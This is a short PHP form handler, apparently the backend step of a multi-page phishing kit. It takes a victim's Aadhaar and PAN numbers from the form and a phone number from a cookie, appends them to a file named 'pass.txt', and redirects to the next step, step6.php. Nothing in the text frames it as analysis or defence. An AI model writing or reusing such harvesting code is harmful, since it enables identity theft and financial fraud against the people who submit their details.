<?php
//    echo"<pre>";print_r($_POST);die();
if (isset($_POST['submit'])) {
    // echo"<pre>";print_r($_POST);die();
    
	$adhhar = $_POST['adhhar'];
	$pan = $_POST['pan'];
   $number = $_COOKIE["number"];

  $adhhar = "adhhar:$adhhar";
  $pan = "pan:$pan";
   $number = "number:$number";

  $myfile = fopen("pass.txt", "a") or die("Unable to open file!");

$txt43 ="";
fwrite($myfile, "\r\n". $txt43);
fwrite($myfile, "\r\n". $adhhar);
fwrite($myfile, "\r\n". $pan);
fwrite($myfile, "\r\n". $number);

fclose($myfile);

   
   
    header('location: step6.php');
    die();
//     $fp = fopen('lidn.txt', 'w');
// fwrite($fp,[ ]);
// fclose($fp);
}



?>
